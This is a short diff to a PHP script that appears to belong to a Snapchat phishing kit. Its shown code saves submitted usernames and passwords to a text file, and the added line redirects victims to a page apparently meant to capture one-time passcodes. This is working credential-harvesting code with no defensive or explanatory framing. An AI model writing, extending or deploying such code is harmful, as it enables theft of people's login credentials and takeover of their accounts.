@@ -12,5 +12,6 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
 }
 
 file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: affiliate-otp.html');
 exit();
 ?>
